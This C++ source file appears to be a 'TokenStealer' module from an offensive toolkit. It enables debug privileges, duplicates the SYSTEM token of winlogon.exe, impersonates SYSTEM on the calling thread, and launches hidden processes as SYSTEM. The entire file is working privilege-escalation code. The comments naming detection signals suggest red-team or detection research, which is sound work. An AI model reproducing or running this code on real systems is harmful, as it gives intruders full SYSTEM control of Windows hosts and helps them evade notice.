#include "TokenStealer.h"

static bool EnablePriv(HANDLE hToken, LPCSTR name) {
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) return false;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

// Find the first SYSTEM-owned process and return a duplicate of its token.
// Caller must CloseHandle the returned handle.
static HANDLE GetSystemToken(DWORD accessFlags) {
    HANDLE hSelf = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) return NULL;
    EnablePriv(hSelf, SE_DEBUG_NAME);
    CloseHandle(hSelf);

    // Target winlogon.exe — always present, always SYSTEM, low contention.
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;

    HANDLE hResult = NULL;
    PROCESSENTRY32 pe = {}; pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            std::string name = pe.szExeFile;
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);
            if (name != S("winlogon.exe")) continue;

            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = NULL;
            if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
                DuplicateTokenEx(hTok, accessFlags, NULL,
                    SecurityImpersonation,
                    accessFlags == TOKEN_ALL_ACCESS ? TokenPrimary : TokenImpersonation,
                    &hResult);
                CloseHandle(hTok);
            }
            CloseHandle(hProc);
            if (hResult) break;
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return hResult;
}

// ── Impersonate SYSTEM on the calling thread ──────────────────────────────────
// Detection signal: OpenProcess on a SYSTEM process (winlogon) from an
// untrusted PID; DuplicateToken + ImpersonateLoggedOnUser from user process.
std::string TokenStealer::StealSystem() {
    HANDLE hDup = GetSystemToken(TOKEN_ALL_ACCESS);
    if (!hDup) {
        return "error: could not duplicate SYSTEM token (pid=" +
               std::to_string(GetCurrentProcessId()) + " err=" +
               std::to_string(GetLastError()) + ")";
    }

    BOOL ok = ImpersonateLoggedOnUser(hDup);
    DWORD err = GetLastError();
    CloseHandle(hDup);

    if (!ok) return "error: ImpersonateLoggedOnUser failed err=" + std::to_string(err);
    return "success: thread is now NT AUTHORITY\\SYSTEM";
}

// ── Spawn process under stolen SYSTEM primary token ───────────────────────────
// Uses CreateProcessAsUserA — requires SeAssignPrimaryTokenPrivilege which is
// granted automatically when the process is already elevated.
// Detection signal: CreateProcessAsUser from user process with SYSTEM token.
DWORD TokenStealer::SpawnAsSystem(const std::string& exe) {
    // Grab privileges
    HANDLE hSelf = NULL;
    if (OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf)) {
        EnablePriv(hSelf, SE_DEBUG_NAME);
        EnablePriv(hSelf, SE_IMPERSONATE_NAME);
        EnablePriv(hSelf, SE_ASSIGNPRIMARYTOKEN_NAME);
        EnablePriv(hSelf, SE_INCREASE_QUOTA_NAME);
        CloseHandle(hSelf);
    }

    HANDLE hPrimary = GetSystemToken(TOKEN_ALL_ACCESS);
    if (!hPrimary) return 0;

    STARTUPINFOA si = {}; si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    char cmd[1024] = {};
    strncpy_s(cmd, exe.c_str(), sizeof(cmd) - 1);

    BOOL ok = CreateProcessAsUserA(hPrimary, NULL, cmd,
        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    DWORD pid = ok ? pi.dwProcessId : 0;
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CloseHandle(hPrimary);
    return pid;
}

void TokenStealer::Revert() {
    RevertToSelf();
}
